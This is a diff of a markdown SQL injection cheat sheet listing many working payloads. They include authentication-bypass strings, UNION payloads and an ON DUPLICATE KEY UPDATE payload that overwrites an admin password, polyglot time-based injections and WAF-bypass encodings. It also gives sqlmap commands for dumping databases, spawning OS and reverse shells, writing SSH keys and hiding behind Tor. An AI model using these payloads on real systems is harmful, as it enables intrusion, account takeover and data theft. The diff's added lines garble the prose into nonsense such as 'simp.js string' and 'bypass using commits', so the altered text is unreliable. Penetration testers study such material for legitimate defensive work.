@@ -1,15 +1,11 @@
 # SQL injection
-
-> A SQL injection attack consists of insertion or "injection" of a SQL query via the input data from the client to the application.
-
-Attempting to manipulate SQL queries may have goals including:
+> sql.attc \jquery insertion or "injection" of sql.dat via i/o.dat from cli-to-app
+*Attempting to manipulate SQL queries may have goals including:
 - Information Leakage
 - Disclosure of stored data
 - Manipulation of stored data
 - Bypassing authorisation controls
-
-## Summary
-
+#
 * [CheatSheet MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md)
 * [CheatSheet MySQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md)
 * [CheatSheet OracleSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/OracleSQL%20Injection.md)
@@ -37,12 +33,9 @@ Attempting to manipulate SQL queries may have goals including:
 * [Routed injection](#routed-injection)
 * [Insert Statement - ON DUPLICATE KEY UPDATE](#insert-statement---on-duplicate-key-update)
 * [WAF Bypass](#waf-bypass)
-
-## Entry point detection
-
-Detection of an SQL injection entry point
-Simple characters
-
+# Entry point detection
+[+]Detection of an SQL injection entry point
+# Simple characters
 ```sql
 '
 %27
@@ -56,16 +49,12 @@ Simple characters
 Wildcard (*)
 &apos;  # required for XML content
 ```
-
-Multiple encoding
-
+# Multiple encoding
 ```sql
 %%2727
 %25%27
 ```
-
-Merging characters
-
+# Merging characters
 ```sql
 `+HERP
 '||'DERP
@@ -74,27 +63,21 @@ Merging characters
 '%20'HERP
 '%2B'HERP
 ```
-
-Logic Testing
-
+# Logic Testing
 ```sql
 page.asp?id=1 or 1=1 -- true
 page.asp?id=1' or 1=1 -- true
 page.asp?id=1" or 1=1 -- true
 page.asp?id=1 and 1=2 -- false
 ```
-
-Weird characters
-
+# Weird characters
 ```sql
 Unicode character U+02BA MODIFIER LETTER DOUBLE PRIME (encoded as %CA%BA) was
 transformed into U+0022 QUOTATION MARK (")
 Unicode character U+02B9 MODIFIER LETTER PRIME (encoded as %CA%B9) was
 transformed into U+0027 APOSTROPHE (')
 ```
-
-## DBMS Identification
-
+# DBMS Identification
 ```c
 ["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
 ["connection_id()=connection_id()"                 ,"MYSQL"],
@@ -122,53 +105,36 @@ transformed into U+0027 APOSTROPHE (')
 ["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
 ```
-
-## SQL injection using SQLmap
-
-### Basic arguments for SQLmap
-
+# SQL injection using SQLmap Basic arguments for SQLmap
 ```powershell
 sqlmap --url="<url>" -p username --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=Linux --banner --is-dba --users --passwords --current-user --dbs
 ```
-
-### Load a request file and use mobile user-agent
-
+# Load a request file and use mobile user-agent
 ```powershell
 sqlmap -r sqli.req --safe-url=http://10.10.10.10/ --mobile --safe-freq=1
 ```
-
-### Custom injection in UserAgent/Header/Referer/Cookie
-
+# Custom injection in UserAgent/Header/Referer/Cookie
 ```powershell
 python sqlmap.py -u "http://example.com" --data "username=admin&password=pass"  --headers="x-forwarded-for:127.0.0.1*"
 The injection is located at the '*'
 ```
-
-### Second order injection
-
+# Second order injection
 ```powershell
 python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
 sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
 ```
-
-### Shell
-
+# Shell
 ```powershell
 SQL Shell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --sql-shell
-
 Simple Shell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-shell
-
 Dropping a reverse-shell / meterpreter
 python sqlmap.py -u "http://example.com/?id=1"  -p id --os-pwn
-
 SSH Shell by dropping an SSH key
 python sqlmap.py -u "http://example.com/?id=1" -p id --file-write=/root/.ssh/id_rsa.pub --file-destination=/home/user/.ssh/
 ```
-
-### Crawl a website with SQLmap and auto-exploit
-
+# Crawl a website with SQLmap and auto-exploit
 ```powershell
 sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3
 
@@ -176,38 +142,26 @@ sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threa
 --crawl = how deep you want to crawl a site
 --forms = Parse and test forms
 ```
-
-### Using TOR with SQLmap
-
+# Using TOR with SQLmap
 ```powershell
 sqlmap -u "http://www.target.com" --tor --tor-type=SOCKS5 --time-sec 11 --check-tor --level=5 --risk=3 --threads=5
 ```
-
-### Using a proxy with SQLmap
-
+# Using a proxy with SQLmap
 ```powershell
 sqlmap -u "http://www.target.com" --proxy="http://127.0.0.1:8080"
 ```
-
-### Using Chrome cookie and a Proxy
-
+# Using Chrome cookie and a Proxy
 ```powershell
 sqlmap -u "https://test.com/index.php?id=99" --load-cookie=/media/truecrypt1/TI/cookie.txt --proxy "http://127.0.0.1:8080"  -f  --time-sec 15 --level 3
 ```
-
-### Using suffix to tamper the injection
-
+# Using suffix to tamper the injection
 ```powershell
 python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
 ```
-
-
-### General tamper option and tamper's list
-
+# General tamper option and tampers list
 ```powershell
 tamper=name_of_the_tamper
 ```
-
 | Tamper | Description |
 | --- | --- |
 |0x2char.py | Replaces each (MySQL) 0x<hex> encoded string with equivalent CONCAT(CHAR(),…) counterpart |
@@ -268,17 +222,12 @@ tamper=name_of_the_tamper
 |versionedkeywords.py | Encloses each non-function keyword with versioned MySQL comment |
 |versionedmorekeywords.py | Encloses each keyword with versioned MySQL comment |
 |xforwardedfor.py | Append a fake HTTP header 'X-Forwarded-For'|
-
-### SQLmap without SQL injection
-
-You can use SQLmap to access a database via its port instead of a URL.
-
+# SQLmap without SQL injection
+*You can use SQLmap to access a database via its port instead of src=URL.
 ```ps1
 sqlmap.py -d "mysql://user:pass@ip/database" --dump-all 
 ```
-
-## Authentication bypass
-
+# 0Auth
 ```sql
 '-'
 ' '
@@ -376,60 +325,42 @@ admin") or "1"="1"#
 admin") or "1"="1"/*
 1234 " AND 1=0 UNION ALL SELECT "admin", "81dc9bdb52d04dc20036dbd8313ed055
 ```
-
-## Authentication Bypass (Raw MD5 SHA1)
-
-When a raw md5 is used, the pass will be queried as a simple string, not a hexstring.
-
-```php
+# Authentication Bypass (Raw MD5 SHA1)
+*When raw.dat md5.sh is used, -pass will be jqueried as a simp.js string, not a Hex.js string.
+<?php>
 "SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
-```
-
-Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
-
-```php
+*Allowing an attacker to craft a string with a `true` statement such as `' or 'SOMETHING`
+<>
 md5("ffifdyop", true) = 'or'6�]��!r,��b
 sha1("3fDf ", true) = Q�u'='�@�[�t�- o��_-!
-```
-
-Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
-
-## Polyglot injection (multicontext)
-
+<>
+*Challenge demo available at [http://web.jarvisoj.com:32772](http://web.jarvisoj.com:32772)
+<>
+# Polyglot injection (multicontext)
 ```sql
 SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
-
 /* MySQL only */
 IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
 ```
-
-## Routed injection
-
+# Routed injection
 ```sql
 admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
 ```
-
-## Insert Statement - ON DUPLICATE KEY UPDATE
-
-ON DUPLICATE KEY UPDATE keywords is used to tell MySQL what to do when the application tries to insert a row that already exists in the table. We can use this to change the admin password by:
-
+# Insert Statement - ON DUPLICATE KEY UPDATE
+* ON DUPLICATE KEY UPDATE KEY-words are used to tell MySQL what to do when app.c tries to insert a row that already exists in the table. ** We can use this to change the admin password by:
 ```sql
-Inject using payload:
+# Inject using payload:
   attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" --
-
-The query would look like this:
+*The query would look like this:
 INSERT INTO users (email, password) VALUES ("attacker_dummy@example.com", "bcrypt_hash_of_qwerty"), ("admin@example.com", "bcrypt_hash_of_qwerty") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_qwerty" -- ", "bcrypt_hash_of_your_password_input");
 
-This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
+*** This query will insert a row for the user “attacker_dummy@example.com”. It will also insert a row for the user “admin@example.com”.
 Because this row already exists, the ON DUPLICATE KEY UPDATE keyword tells MySQL to update the `password` column of the already existing row to "bcrypt_hash_of_qwerty".
-
-After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
+**** After this, we can simply authenticate with “admin@example.com” and the password “qwerty”!
 ```
-
-## WAF Bypass
-
-No Space (%20) - bypass using whitespace alternatives
-
+# WAF Bypass
+* No Space (%20) - bypass using whitespace alternatives
+<>
 ```sql
 ?id=1%09and%091=1%09--
 ?id=1%0Dand%0D1=1%0D--
@@ -439,13 +370,13 @@ No Space (%20) - bypass using whitespace alternatives
 ?id=1%A0and%A01=1%A0--
 ```
 
-No Whitespace - bypass using comments
+[+]No Wh'ite--space - bypass using commits
 
 ```sql
 ?id=1/*comment*/and/**/1=1/**/--
 ```
 
-No Whitespace - bypass using parenthesis
+[+] No Wh'ite--space - bypass using ()
 
 ```sql
 ?id=(1)and(1)=(1)--
